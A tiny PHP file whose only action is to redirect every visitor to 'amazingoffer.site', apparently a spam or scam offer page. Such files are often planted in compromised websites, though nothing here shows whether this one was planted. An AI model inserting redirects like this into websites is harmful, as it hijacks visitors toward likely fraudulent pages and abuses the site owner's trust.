<?php
header('Location: http://amazingoffer.site/');
?>
